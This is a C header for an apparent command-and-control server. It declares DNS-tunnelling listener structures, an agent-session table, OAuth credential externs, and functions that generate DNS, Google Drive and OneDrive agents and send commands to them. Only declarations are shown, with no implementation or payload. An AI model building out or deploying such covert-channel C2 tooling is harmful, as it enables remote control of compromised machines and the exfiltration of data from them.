#ifndef C2_CORE_H
#define C2_CORE_H

#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <pthread.h> 
#include <time.h>

#define BUF_SIZE     1500
#define CHUNK_BYTES  30      
#define MAX_CHUNKS   10000   

#define COLOR_RESET   "\033[0m"
#define COLOR_GREEN   "\033[32m"
#define COLOR_RED     "\033[31m"
#define COLOR_BLUE    "\033[34m"
#define COLOR_YELLOW  "\033[33m"
#define COLOR_CYAN    "\033[36m"

#pragma pack(push, 1)
struct DNS_ANSWER {
    unsigned short name;
    unsigned short type;
    unsigned short class;
    unsigned int   ttl;
    unsigned short data_len;
    unsigned int   address;
};
#pragma pack(pop)

typedef struct {
    int seen;
    int len;
    unsigned char data[CHUNK_BYTES];
} Chunk;

typedef struct {
    int id;
    char name[50];       
    char channel[20];    
    char last_seen[30];  
} C2Agent;

extern char selected_channel[20]; 
extern int dns_listener_running;      
extern int drive_listener_running;     
extern int dns_sockfd;                
extern char dns_command_buffer[512];  

extern C2Agent sessions[100];         
extern int session_count;         
extern int current_interact_id;  
extern int wes_pipeline_active;

extern const char *GLOBAL_CLIENT_ID;
extern const char *GLOBAL_CLIENT_SECRET;
extern const char *GLOBAL_REFRESH_TOKEN;
extern const char *GLOBAL_CMD_FILE_ID;
extern const char *GLOBAL_RES_FILE_ID;

void add_or_update_session(const char *agent_name, const char *channel);
void print_sessions(void);
void print_banner(void);
void print_help(void);
void print_listeners(void);

int is_digits(const char *s);
int is_hex_str(const char *s);
int decode_domain_name(const unsigned char *packet, int pkt_len, int offset, unsigned char *out, int out_len);
unsigned char hex_to_byte(const char *hex);
void reset_state(void);

void generate_drive_agent(void);
void generate_dns_agent(void);
void send_command_to_drive(const char *target_agent, const char *command_text);
void* drive_listener_thread(void* arg);
void* dns_listener_thread(void* arg);


/* OneDrive related declarations */
extern const char *ONEDRIVE_CLIENT_ID;
extern const char *ONEDRIVE_CLIENT_SECRET;
extern const char *ONEDRIVE_REFRESH_TOKEN;

extern int onedrive_listener_running;

void generate_onedrive_agent(void);
void send_command_to_onedrive(const char *target_agent, const char *command_text);
void* onedrive_listener_thread(void* arg);

#endif
